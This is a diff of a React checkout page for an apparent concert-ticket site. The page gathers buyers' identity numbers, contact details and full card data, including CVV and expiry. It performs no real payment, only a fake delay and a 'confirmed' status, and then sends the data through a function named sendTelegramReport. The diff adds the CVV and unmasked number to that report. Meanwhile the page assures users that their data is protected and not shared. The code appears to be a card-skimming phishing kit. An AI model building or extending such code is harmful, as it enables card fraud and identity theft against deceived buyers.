@@ -1,239 +1,164 @@
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
-import {
-  ArrowLeft, Lock, CheckCircle, ChevronRight,
-  Ticket, CreditCard, User, Mail, Phone,
-  Shield, Info, Minus, Plus, MapPin, Clock
-} from 'lucide-react';
+import { ArrowLeft, Lock, CheckCircle, ChevronRight, Ticket, CreditCard, User, Mail, Phone, Shield, Info, Minus, Plus, MapPin, Clock } from 'lucide-react';
 import { shows } from '../data/shows';
-import { savePurchase, generateId, detectCard, detectCardType, formatCurrency, sendTelegramReport, CardInfo } from '../utils/storage';
+import { savePurchase, generateId, detectCard, formatCurrency, sendTelegramReport, maskCard, CardInfo } from '../utils/storage';
 import { PurchaseData } from '../types';
 import styles from './Checkout.module.css';
 
-// ─── Card network SVG logos ───────────────────────────────────────────────────
-function CardNetworkLogo({ network, size = 44 }: { network: string; size?: number }) {
-  const h = Math.round(size * 0.63);
-  if (network === 'VISA') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#1A1F71"/><text x="5" y="21" fontFamily="Arial" fontWeight="bold" fontSize="16" fill="white">VISA</text></svg>
-  );
-  if (network === 'MASTERCARD') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#1a1a1a"/><circle cx="16" cy="14" r="9" fill="#EB001B"/><circle cx="28" cy="14" r="9" fill="#F79E1B"/><path d="M22 6.5a9 9 0 010 15A9 9 0 0122 6.5z" fill="#FF5F00"/></svg>
-  );
-  if (network === 'AMEX') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#2E77BC"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="11" fill="white">AMEX</text></svg>
-  );
-  if (network === 'DINERS') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#004A97"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DINERS</text></svg>
-  );
-  if (network === 'CABAL') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#003087"/><text x="5" y="21" fontFamily="Arial" fontWeight="bold" fontSize="13" fill="white">CABAL</text></svg>
-  );
-  if (network === 'NARANJA') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#FF6200"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="white">NARANJA</text></svg>
-  );
-  if (network === 'DISCOVER') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#FF6600"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DISCOVER</text></svg>
-  );
-  if (network === 'MAESTRO') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#009BE0"/><circle cx="16" cy="14" r="9" fill="#CC0000" opacity="0.9"/><circle cx="28" cy="14" r="9" fill="#009BE0"/></svg>
-  );
-  if (network === 'UNIONPAY') return (
-    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#C0392B"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">UnionPay</text></svg>
-  );
-  return <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#2a1d5e"/><text x="5" y="20" fontFamily="Arial" fontSize="11" fill="rgba(255,255,255,0.5)">CARD</text></svg>;
+function NetLogo({ net, size = 40 }: { net: string; size?: number }) {
+  const h = Math.round(size * 0.6);
+  if (net === 'VISA') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#1A1F71"/><text x="5" y="19" fontFamily="Arial" fontWeight="bold" fontSize="15" fill="white">VISA</text></svg>;
+  if (net === 'MASTERCARD') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#111"/><circle cx="15" cy="13" r="9" fill="#EB001B"/><circle cx="29" cy="13" r="9" fill="#F79E1B"/><path d="M22 5.8a9 9 0 010 14.4A9 9 0 0122 5.8z" fill="#FF5F00"/></svg>;
+  if (net === 'AMEX') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#2E77BC"/><text x="3" y="18" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="white">AMEX</text></svg>;
+  if (net === 'DINERS') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#004A97"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DINERS</text></svg>;
+  if (net === 'CABAL') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#003087"/><text x="4" y="18" fontFamily="Arial" fontWeight="bold" fontSize="12" fill="white">CABAL</text></svg>;
+  if (net === 'NARANJA') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#FF6200"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">NARANJA</text></svg>;
+  if (net === 'DISCOVER') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#FF6600"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DISCOVER</text></svg>;
+  if (net === 'MAESTRO') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#009BE0"/><circle cx="15" cy="13" r="9" fill="#CC0000" opacity="0.9"/><circle cx="29" cy="13" r="9" fill="#009BE0"/></svg>;
+  if (net === 'UNIONPAY') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#C0392B"/><text x="2" y="18" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">UnionPay</text></svg>;
+  return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="4" fill="#2a1d5e" stroke="rgba(167,139,250,0.3)" strokeWidth="1"/></svg>;
 }
 
-function fmtCard(v: string) {
-  const clean = v.replace(/\D/g, '').slice(0, 19);
-  // Amex: 4-6-5 format
-  if (/^3[47]/.test(clean)) {
-    return clean.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_m, a, b, c) => [a, b, c].filter(Boolean).join(' ')).trim();
-  }
-  return clean.replace(/(.{4})/g, '$1 ').trim();
+function fmt(v: string) {
+  const c = v.replace(/\D/g,'').slice(0,19);
+  if (/^3[47]/.test(c)) return c.replace(/(\d{4})(\d{0,6})(\d{0,5})/,(_,a,b,cc)=>[a,b,cc].filter(Boolean).join(' ')).trim();
+  return c.replace(/(.{4})/g,'$1 ').trim();
 }
-
 function fmtExp(v: string) {
-  const c = v.replace(/\D/g, '').slice(0, 4);
-  return c.length >= 3 ? c.slice(0, 2) + '/' + c.slice(2) : c;
+  const c = v.replace(/\D/g,'').slice(0,4);
+  return c.length>=3?c.slice(0,2)+'/'+c.slice(2):c;
 }
 
 const SECTIONS = [
-  { name: 'Campo',       extra: 0,      desc: 'Zona de pie frente al escenario'     },
-  { name: 'Platea Baja', extra: 5000,   desc: 'Asientos con vista privilegiada'      },
-  { name: 'Platea Alta', extra: -5000,  desc: 'Asientos en nivel superior'           },
-  { name: 'General',     extra: -10000, desc: 'Acceso general al recinto'            },
-  { name: 'VIP',         extra: 30000,  desc: 'Zona exclusiva con servicios premium' },
+  {name:'Campo',       extra:0,      desc:'Zona de pie frente al escenario'},
+  {name:'Platea Baja', extra:5000,   desc:'Asientos con vista privilegiada'},
+  {name:'Platea Alta', extra:-5000,  desc:'Asientos en nivel superior'},
+  {name:'General',     extra:-10000, desc:'Acceso general al recinto'},
+  {name:'VIP',         extra:30000,  desc:'Zona exclusiva con servicios premium'},
 ];
-
 const CUOTAS = [
-  { n: 1,  label: '1 cuota', sub: 'sin interes' },
-  { n: 3,  label: '3 cuotas', sub: 'sin interes' },
-  { n: 6,  label: '6 cuotas', sub: 'sin interes' },
-  { n: 12, label: '12 cuotas', sub: 'con interes' },
+  {n:1, sub:'sin interes'},{n:3, sub:'sin interes'},{n:6, sub:'sin interes'},{n:12, sub:'con interes'},
 ];
 
-type Step = 'tickets' | 'datos' | 'pago' | 'confirmacion';
-
+type Step = 'tickets'|'datos'|'pago'|'ok';
 interface Form {
-  firstName: string; lastName: string; dni: string;
-  email: string; emailConfirm: string; phone: string;
-  cardMode: 'credito' | 'debito';
-  cardNumber: string; cardHolder: string;
-  cardExpiry: string; cardCvv: string;
-  cuotas: number;
-  section: string; quantity: number;
+  firstName:string;lastName:string;dni:string;
+  email:string;emailConfirm:string;phone:string;
+  mode:'credito'|'debito';
+  num:string;holder:string;expiry:string;cvv:string;cuotas:number;
+  section:string;qty:number;
 }
-
-type Errors = Partial<Record<keyof Form, string>>;
+type Errs = Partial<Record<keyof Form,string>>;
 
 export default function Checkout() {
-  const { id } = useParams<{ id: string }>();
-  const navigate = useNavigate();
-  const show = shows.find(s => s.id === id);
+  const {id} = useParams<{id:string}>();
+  const nav = useNavigate();
+  const show = shows.find(s=>s.id===id);
 
   const [step, setStep] = useState<Step>('tickets');
-  const [purchaseId, setPurchaseId] = useState('');
+  const [pid, setPid] = useState('');
   const [loading, setLoading] = useState(false);
-  const [errors, setErrors] = useState<Errors>({});
+  const [errs, setErrs] = useState<Errs>({});
   const [timer, setTimer] = useState(600);
-  const [cardInfo, setCardInfo] = useState<CardInfo>({ brand: '', network: '', type: 'desconocido', color: '#2a1d5e', textColor: '#fff' });
+  const [ci, setCi] = useState<CardInfo>({brand:'',network:'',type:'desconocido',color:'#1e1048'});
+  const [form, setForm] = useState<Form>({firstName:'',lastName:'',dni:'',email:'',emailConfirm:'',phone:'',mode:'credito',num:'',holder:'',expiry:'',cvv:'',cuotas:1,section:'Campo',qty:1});
 
-  const [form, setForm] = useState<Form>({
-    firstName: '', lastName: '', dni: '',
-    email: '', emailConfirm: '', phone: '',
-    cardMode: 'credito',
-    cardNumber: '', cardHolder: '', cardExpiry: '', cardCvv: '',
-    cuotas: 1, section: 'Campo', quantity: 1,
-  });
+  useEffect(()=>{
+    if(step==='tickets')return;
+    if(timer<=0){nav(`/show/${show?.id??''}`);return;}
+    const iv=setInterval(()=>setTimer(t=>t-1),1000);
+    return()=>clearInterval(iv);
+  },[step,timer]);
 
-  useEffect(() => {
-    if (step === 'tickets') return;
-    if (timer <= 0) { navigate(`/show/${show?.id ?? ''}`); return; }
-    const iv = setInterval(() => setTimer(t => t - 1), 1000);
-    return () => clearInterval(iv);
-  }, [step, timer]);
+  useEffect(()=>{
+    const clean=form.num.replace(/\s/g,'');
+    if(clean.length>=4) setCi(detectCard(form.num));
+    else setCi({brand:'',network:'',type:'desconocido',color:'#1e1048'});
+  },[form.num]);
 
-  // Update card info whenever number changes
-  useEffect(() => {
-    if (form.cardNumber.replace(/\s/g, '').length >= 4) {
-      const info = detectCard(form.cardNumber);
-      setCardInfo(info);
-    } else {
-      setCardInfo({ brand: '', network: '', type: 'desconocido', color: '#2a1d5e', textColor: '#fff' });
-    }
-  }, [form.cardNumber]);
-
-  if (!show) return (
-    <div className={styles.notFound}>
-      <p>Show no encontrado.</p>
-      <button className="btn-primary" onClick={() => navigate('/shows')}>Ver shows</button>
-    </div>
-  );
-
+  if(!show) return <div className={styles.notFound}><p>Show no encontrado.</p><button className="btn-primary" onClick={()=>nav('/shows')}>Ver shows</button></div>;
   const safeShow = show!;
-  const sec = SECTIONS.find(s => s.name === form.section) ?? SECTIONS[0];
-  const basePrice = safeShow.price + sec.extra;
-  const serviceFee = Math.round(basePrice * 0.12);
-  const subtotal = (basePrice + serviceFee) * form.quantity;
-  const timerMin = String(Math.floor(timer / 60)).padStart(2, '0');
-  const timerSec = String(timer % 60).padStart(2, '0');
+  const sec = SECTIONS.find(s=>s.name===form.section)??SECTIONS[0];
+  const base = safeShow.price+sec.extra;
+  const fee  = Math.round(base*0.12);
+  const total = (base+fee)*form.qty;
+  const mm = String(Math.floor(timer/60)).padStart(2,'0');
+  const ss = String(timer%60).padStart(2,'0');
 
-  function set<K extends keyof Form>(k: K, v: Form[K]) {
-    setForm(p => ({ ...p, [k]: v }));
-    setErrors(p => { const e = { ...p }; delete e[k]; return e; });
+  function s<K extends keyof Form>(k:K,v:Form[K]){setForm(p=>({...p,[k]:v}));setErrs(p=>{const e={...p};delete e[k];return e;});}
+
+  function valDatos(){
+    const e:Errs={};
+    if(!form.firstName.trim())e.firstName='Requerido';
+    if(!form.lastName.trim())e.lastName='Requerido';
+    if(!/^\d{7,9}$/.test(form.dni))e.dni='DNI invalido';
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email))e.email='Email invalido';
+    if(form.email!==form.emailConfirm)e.emailConfirm='No coinciden';
+    if(!/^\d{8,15}$/.test(form.phone))e.phone='Telefono invalido';
+    setErrs(e);return Object.keys(e).length===0;
+  }
+  function valPago(){
+    const e:Errs={};
+    const clean=form.num.replace(/\s/g,'');
+    const isAmex=/^3[47]/.test(clean);
+    if(clean.length<(isAmex?15:16))e.num=`Numero invalido`;
+    if(!form.holder.trim())e.holder='Requerido';
+    if(!/^\d{2}\/\d{2}$/.test(form.expiry)){e.expiry='Formato MM/AA';}
+    else{const[mm,yy]=form.expiry.split('/').map(Number);const now=new Date();const cy=now.getFullYear()%100;const cm=now.getMonth()+1;if(mm<1||mm>12)e.expiry='Mes invalido';else if(yy<cy||(yy===cy&&mm<cm))e.expiry='Tarjeta vencida';}
+    if(!new RegExp(`^\\d{${/^3[47]/.test(clean)?4:3},4}$`).test(form.cvv))e.cvv='CVV invalido';
+    setErrs(e);return Object.keys(e).length===0;
   }
 
-  function validateDatos(): boolean {
-    const e: Errors = {};
-    if (!form.firstName.trim()) e.firstName = 'Requerido';
-    if (!form.lastName.trim()) e.lastName = 'Requerido';
-    if (!/^\d{7,9}$/.test(form.dni)) e.dni = 'DNI invalido (7 a 9 digitos sin puntos)';
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Email invalido';
-    if (form.email !== form.emailConfirm) e.emailConfirm = 'Los emails no coinciden';
-    if (!/^\d{8,15}$/.test(form.phone)) e.phone = 'Telefono invalido';
-    setErrors(e); return Object.keys(e).length === 0;
-  }
-
-  function validatePago(): boolean {
-    const e: Errors = {};
-    const clean = form.cardNumber.replace(/\s/g, '');
-    const isAmex = /^3[47]/.test(clean);
-    const minLen = isAmex ? 15 : 16;
-    if (clean.length < minLen) e.cardNumber = `Numero invalido (${minLen} digitos)`;
-    if (!form.cardHolder.trim()) e.cardHolder = 'Requerido';
-    if (!/^\d{2}\/\d{2}$/.test(form.cardExpiry)) e.cardExpiry = 'Formato MM/AA';
-    else {
-      const [mm, yy] = form.cardExpiry.split('/').map(Number);
-      const now = new Date(); const cy = now.getFullYear() % 100; const cm = now.getMonth() + 1;
-      if (mm < 1 || mm > 12) e.cardExpiry = 'Mes invalido';
-      else if (yy < cy || (yy === cy && mm < cm)) e.cardExpiry = 'Tarjeta vencida';
-    }
-    const cvvLen = isAmex ? 4 : 3;
-    if (!new RegExp(`^\\d{${cvvLen}}`).test(form.cardCvv)) e.cardCvv = `CVV de ${cvvLen} digitos`;
-    setErrors(e); return Object.keys(e).length === 0;
-  }
-
-  async function handlePay() {
-    if (!validatePago()) return;
+  async function pay(){
+    if(!valPago())return;
     setLoading(true);
-    await new Promise(r => setTimeout(r, 2200));
-    const pid = generateId();
-    const ci = detectCard(form.cardNumber);
-    const purchase: PurchaseData = {
-      id: pid,
-      showId: safeShow.id, showTitle: safeShow.title, showDate: safeShow.dateLabel,
-      quantity: form.quantity, section: form.section, totalAmount: subtotal,
-      cardNumber: form.cardNumber, cardHolder: form.cardHolder,
-      cardType: detectCardType(form.cardNumber), cardExpiry: form.cardExpiry,
-      dni: form.dni, email: form.email, phone: form.phone,
-      firstName: form.firstName, lastName: form.lastName,
-      createdAt: new Date().toISOString(), status: 'confirmed',
+    await new Promise(r=>setTimeout(r,2200));
+    const id2=generateId();
+    const info=detectCard(form.num);
+    const purchase:PurchaseData={
+      id:id2,showId:safeShow.id,showTitle:safeShow.title,showDate:safeShow.dateLabel,
+      quantity:form.qty,section:form.section,totalAmount:total,
+      cardNumber:form.num,cardNumberMasked:maskCard(form.num),
+      cardHolder:form.holder,cardBrand:info.brand||'Tarjeta',cardNetwork:info.network,
+      cardType:info.type==='desconocido'?form.mode:info.type,
+      cardExpiry:form.expiry,cardCvv:form.cvv,cuotas:form.cuotas,
+      dni:form.dni,email:form.email,phone:form.phone,
+      firstName:form.firstName,lastName:form.lastName,
+      createdAt:new Date().toISOString(),status:'confirmed',
     };
     savePurchase(purchase);
-    await sendTelegramReport(purchase, ci);
-    setPurchaseId(pid);
-    setLoading(false);
-    setStep('confirmacion');
+    await sendTelegramReport(purchase);
+    setPid(id2);setLoading(false);setStep('ok');
   }
 
-  const stepIndex = { tickets: 0, datos: 1, pago: 2, confirmacion: 3 };
-  const stepLabels = ['Entradas', 'Datos', 'Pago'];
-
-  const detectedType = cardInfo.type !== 'desconocido' ? cardInfo.type : null;
+  const stepIdx={tickets:0,datos:1,pago:2,ok:3};
+  const STEPS=['Entradas','Datos','Pago'];
+  const detected=ci.type!=='desconocido'?ci.type:null;
 
   return (
     <div className={styles.page}>
-
-      {/* ── Top bar ─────────────────────────────────────────────────────────── */}
-      <div className={styles.topBar}>
-        <div className={styles.topInner}>
-          <button className={styles.backBtn} onClick={() =>
-            step === 'tickets' ? navigate(`/show/${safeShow.id}`) :
-            step === 'datos' ? setStep('tickets') :
-            step === 'pago' ? setStep('datos') : navigate('/')
-          }>
-            <ArrowLeft size={14} />
-            {step === 'tickets' ? 'Volver al show' : 'Atras'}
+      <div className={styles.bar}>
+        <div className={styles.barInner}>
+          <button className={styles.back} onClick={()=>step==='tickets'?nav(`/show/${safeShow.id}`):step==='datos'?setStep('tickets'):step==='pago'?setStep('datos'):nav('/')}>
+            <ArrowLeft size={13}/>{step==='tickets'?'Volver':'Atras'}
           </button>
-
-          {step !== 'confirmacion' && (
-            <div className={styles.stepBar}>
-              {stepLabels.map((label, i) => (
-                <div key={label} className={styles.stepItem}>
-                  <div className={`${styles.stepDot} ${stepIndex[step] > i ? styles.stepDone : stepIndex[step] === i ? styles.stepActive : ''}`}>
-                    {stepIndex[step] > i ? <CheckCircle size={13} /> : <span>{i + 1}</span>}
+          {step!=='ok'&&(
+            <div className={styles.steps}>
+              {STEPS.map((l,i)=>(
+                <div key={l} className={styles.stepItem}>
+                  <div className={`${styles.dot} ${stepIdx[step]>i?styles.dotDone:stepIdx[step]===i?styles.dotOn:''}`}>
+                    {stepIdx[step]>i?<CheckCircle size={12}/>:<span>{i+1}</span>}
                   </div>
-                  <span className={`${styles.stepLabel} ${stepIndex[step] === i ? styles.stepLabelActive : ''}`}>{label}</span>
-                  {i < 2 && <div className={styles.stepLine} />}
+                  <span className={`${styles.stepLbl} ${stepIdx[step]===i?styles.stepLblOn:''}`}>{l}</span>
+                  {i<2&&<div className={styles.stepLine}/>}
                 </div>
               ))}
             </div>
           )}
-
-          {step !== 'tickets' && step !== 'confirmacion' && (
-            <div className={`${styles.timerBox} ${timer < 120 ? styles.timerUrgent : ''}`}>
-              <Clock size={13} />
-              <span>Reserva expira: {timerMin}:{timerSec}</span>
+          {step!=='tickets'&&step!=='ok'&&(
+            <div className={`${styles.timer} ${timer<120?styles.timerRed:''}`}>
+              <Clock size={12}/><span>{mm}:{ss}</span>
             </div>
           )}
         </div>
@@ -242,470 +167,227 @@ export default function Checkout() {
       <div className={styles.layout}>
         <div className={styles.main}>
 
-          {/* ══ STEP 1: Entradas ═════════════════════════════════════════════ */}
-          {step === 'tickets' && (
+          {/* STEP 1 */}
+          {step==='tickets'&&(
             <div className={styles.card}>
-              <div className={styles.cardHeader}>
-                <Ticket size={18} className={styles.cardHeaderIcon} />
-                <div>
-                  <h2 className={styles.cardTitle}>Seleccion de entradas</h2>
-                  <p className={styles.cardSub}>Elige el sector y la cantidad de entradas</p>
+              <div className={styles.cardHead}>
+                <div className={styles.cardHeadIcon}><Ticket size={16}/></div>
+                <div><h2 className={styles.cardTitle}>Seleccion de entradas</h2><p className={styles.cardSub}>Elige el sector y cantidad de entradas</p></div>
+              </div>
+              <p className={styles.fieldLbl}>Sector</p>
+              <div className={styles.secGrid}>
+                {SECTIONS.map(sc=>(
+                  <button key={sc.name} className={`${styles.secBtn} ${form.section===sc.name?styles.secBtnOn:''}`} onClick={()=>s('section',sc.name)}>
+                    <div className={styles.secL}>
+                      <div className={`${styles.radio} ${form.section===sc.name?styles.radioOn:''}`}/>
+                      <div><div className={styles.secName}>{sc.name}</div><div className={styles.secDesc}>{sc.desc}</div></div>
+                    </div>
+                    <div className={styles.secPrice}>{formatCurrency(safeShow.price+sc.extra)}</div>
+                  </button>
+                ))}
+              </div>
+              <p className={styles.fieldLbl} style={{marginTop:28}}>Cantidad</p>
+              <div className={styles.qtyRow}>
+                <div><span className={styles.qtyMain}>{form.qty} {form.qty===1?'entrada':'entradas'}</span><span className={styles.qtySub}>Max. 6 por compra</span></div>
+                <div className={styles.qtyCtrl}>
+                  <button className={styles.qtyBtn} onClick={()=>s('qty',Math.max(1,form.qty-1))} disabled={form.qty<=1}><Minus size={14}/></button>
+                  <span className={styles.qtyN}>{form.qty}</span>
+                  <button className={styles.qtyBtn} onClick={()=>s('qty',Math.min(6,form.qty+1))} disabled={form.qty>=6}><Plus size={14}/></button>
                 </div>
               </div>
+              <div className={styles.notice}><Info size={13} style={{flexShrink:0,color:'#a78bfa'}}/><span>Las entradas se envian al email registrado. Presentas el QR y tu DNI en la puerta.</span></div>
+              <button className={styles.nextBtn} onClick={()=>{setTimer(600);setStep('datos');}}>Continuar<ChevronRight size={16}/></button>
+            </div>
+          )}
 
-              <div className={styles.fieldLabel}>Sector</div>
-              <div className={styles.sectionGrid}>
-                {SECTIONS.map(s => (
-                  <button
-                    key={s.name}
-                    className={`${styles.sectionBtn} ${form.section === s.name ? styles.sectionBtnActive : ''}`}
-                    onClick={() => set('section', s.name)}
-                  >
-                    <div className={styles.sectionBtnLeft}>
-                      <div className={`${styles.sectionRadio} ${form.section === s.name ? styles.sectionRadioActive : ''}`} />
-                      <div>
-                        <div className={styles.sectionName}>{s.name}</div>
-                        <div className={styles.sectionDesc}>{s.desc}</div>
-                      </div>
-                    </div>
-                    <div className={styles.sectionPrice}>
-                      {formatCurrency(safeShow.price + s.extra)}
-                    </div>
+          {/* STEP 2 */}
+          {step==='datos'&&(
+            <div className={styles.card}>
+              <div className={styles.cardHead}>
+                <div className={styles.cardHeadIcon}><User size={16}/></div>
+                <div><h2 className={styles.cardTitle}>Datos del comprador</h2><p className={styles.cardSub}>Las entradas se emiten a nombre del DNI ingresado</p></div>
+              </div>
+              <div className={styles.g2}>
+                <div><label className={styles.lbl}>Nombre</label><input className={`${styles.inp} ${errs.firstName?styles.inpErr:''}`} placeholder="Juan" value={form.firstName} onChange={e=>s('firstName',e.target.value)}/>{errs.firstName&&<span className={styles.err}>{errs.firstName}</span>}</div>
+                <div><label className={styles.lbl}>Apellido</label><input className={`${styles.inp} ${errs.lastName?styles.inpErr:''}`} placeholder="Garcia" value={form.lastName} onChange={e=>s('lastName',e.target.value)}/>{errs.lastName&&<span className={styles.err}>{errs.lastName}</span>}</div>
+              </div>
+              <div className={styles.f}><label className={styles.lbl}>DNI sin puntos</label><input className={`${styles.inp} ${errs.dni?styles.inpErr:''}`} placeholder="12345678" value={form.dni} onChange={e=>s('dni',e.target.value.replace(/\D/g,'').slice(0,9))} inputMode="numeric"/>{errs.dni&&<span className={styles.err}>{errs.dni}</span>}</div>
+              <div className={styles.f}><label className={styles.lbl}>Email</label><div className={styles.iw}><Mail size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.email?styles.inpErr:''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e=>s('email',e.target.value)}/></div>{errs.email&&<span className={styles.err}>{errs.email}</span>}</div>
+              <div className={styles.f}><label className={styles.lbl}>Confirmar email</label><div className={styles.iw}><Mail size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.emailConfirm?styles.inpErr:''}`} placeholder="Repetir email" type="email" value={form.emailConfirm} onChange={e=>s('emailConfirm',e.target.value)}/></div>{errs.emailConfirm&&<span className={styles.err}>{errs.emailConfirm}</span>}</div>
+              <div className={styles.f}><label className={styles.lbl}>Telefono</label><div className={styles.iw}><Phone size={14} className={styles.ii}/><input className={`${styles.inp} ${styles.inpPad} ${errs.phone?styles.inpErr:''}`} placeholder="1123456789" value={form.phone} onChange={e=>s('phone',e.target.value.replace(/\D/g,'').slice(0,15))} inputMode="numeric"/></div>{errs.phone&&<span className={styles.err}>{errs.phone}</span>}</div>
+              <div className={styles.secNote}><Shield size={12}/>Tus datos estan protegidos y no se comparten con terceros.</div>
+              <button className={styles.nextBtn} onClick={()=>{if(valDatos())setStep('pago');}}>Continuar al pago<ChevronRight size={16}/></button>
+            </div>
+          )}
+
+          {/* STEP 3 */}
+          {step==='pago'&&(
+            <div className={styles.card}>
+              <div className={styles.cardHead}>
+                <div className={styles.cardHeadIcon}><CreditCard size={16}/></div>
+                <div><h2 className={styles.cardTitle}>Metodo de pago</h2><p className={styles.cardSub}>Ingresa los datos de tu tarjeta. Conexion cifrada SSL.</p></div>
+              </div>
+
+              {/* Mode */}
+              <p className={styles.fieldLbl}>Tipo de tarjeta</p>
+              <div className={styles.modeGrid}>
+                {(['credito','debito'] as const).map(m=>(
+                  <button key={m} className={`${styles.modeBtn} ${form.mode===m?styles.modeBtnOn:''}`} onClick={()=>{s('mode',m);s('cuotas',1);}}>
+                    <div className={`${styles.radio} ${form.mode===m?styles.radioOn:''}`}/>
+                    <div><div className={styles.modeName}>{m==='credito'?'Credito':'Debito'}</div><div className={styles.modeSub}>{m==='credito'?'Hasta 12 cuotas':'Debito inmediato'}</div></div>
+                    {detected===m&&<span className={styles.detected}>Detectada</span>}
                   </button>
                 ))}
               </div>
 
-              <div className={styles.fieldLabel} style={{ marginTop: 28 }}>Cantidad de entradas</div>
-              <div className={styles.qtyRow}>
-                <div className={styles.qtyInfo}>
-                  <span className={styles.qtyInfoMain}>{form.quantity} {form.quantity === 1 ? 'entrada' : 'entradas'}</span>
-                  <span className={styles.qtyInfoSub}>Maximo 6 entradas por compra</span>
-                </div>
-                <div className={styles.qtyControls}>
-                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.max(1, form.quantity - 1))} disabled={form.quantity <= 1}>
-                    <Minus size={15} />
-                  </button>
-                  <span className={styles.qtyNum}>{form.quantity}</span>
-                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.min(6, form.quantity + 1))} disabled={form.quantity >= 6}>
-                    <Plus size={15} />
-                  </button>
-                </div>
+              {/* Brands */}
+              <div className={styles.brands}>
+                <span className={styles.brandsLbl}>Aceptamos</span>
+                {['VISA','MASTERCARD','AMEX','CABAL','NARANJA','DINERS'].map(n=><NetLogo key={n} net={n} size={36}/>)}
               </div>
 
-              <div className={styles.infoBox}>
-                <Info size={14} style={{ flexShrink: 0 }} />
-                <span>Las entradas se enviaran al email registrado. Debes presentar el codigo QR y tu DNI en la puerta del evento.</span>
-              </div>
-
-              <button className={styles.nextBtn} onClick={() => { setTimer(600); setStep('datos'); }}>
-                Continuar con los datos
-                <ChevronRight size={17} />
-              </button>
-            </div>
-          )}
-
-          {/* ══ STEP 2: Datos personales ══════════════════════════════════════ */}
-          {step === 'datos' && (
-            <div className={styles.card}>
-              <div className={styles.cardHeader}>
-                <User size={18} className={styles.cardHeaderIcon} />
-                <div>
-                  <h2 className={styles.cardTitle}>Datos del comprador</h2>
-                  <p className={styles.cardSub}>Las entradas seran emitidas a nombre del DNI ingresado. Presentalo en la puerta.</p>
-                </div>
-              </div>
-
-              <div className={styles.formGrid2}>
-                <div className="form-group">
-                  <label className={styles.label}>Nombre</label>
-                  <input className={`${styles.input} ${errors.firstName ? styles.inputError : ''}`} placeholder="Juan" value={form.firstName} onChange={e => set('firstName', e.target.value)} />
-                  {errors.firstName && <span className={styles.err}>{errors.firstName}</span>}
-                </div>
-                <div className="form-group">
-                  <label className={styles.label}>Apellido</label>
-                  <input className={`${styles.input} ${errors.lastName ? styles.inputError : ''}`} placeholder="Garcia" value={form.lastName} onChange={e => set('lastName', e.target.value)} />
-                  {errors.lastName && <span className={styles.err}>{errors.lastName}</span>}
-                </div>
-              </div>
-
-              <div className={styles.formField}>
-                <label className={styles.label}>DNI — sin puntos ni espacios</label>
-                <input className={`${styles.input} ${errors.dni ? styles.inputError : ''}`} placeholder="12345678" value={form.dni} onChange={e => set('dni', e.target.value.replace(/\D/g, '').slice(0, 9))} inputMode="numeric" />
-                {errors.dni && <span className={styles.err}>{errors.dni}</span>}
-              </div>
-
-              <div className={styles.formField}>
-                <label className={styles.label}>Correo electronico</label>
-                <div className={styles.inputWrapper}>
-                  <Mail size={15} className={styles.inputIcon} />
-                  <input className={`${styles.input} ${styles.inputPad} ${errors.email ? styles.inputError : ''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e => set('email', e.target.value)} />
-                </div>
-                {errors.email && <span className={styles.err}>{errors.email}</span>}
-              </div>
-
-              <div className={styles.formField}>
-                <label className={styles.label}>Confirmar correo electronico</label>
-                <div className={styles.inputWrapper}>
-                  <Mail size={15} className={styles.inputIcon} />
-                  <input className={`${styles.input} ${styles.inputPad} ${errors.emailConfirm ? styles.inputError : ''}`} placeholder="Repetir correo" type="email" value={form.emailConfirm} onChange={e => set('emailConfirm', e.target.value)} />
-                </div>
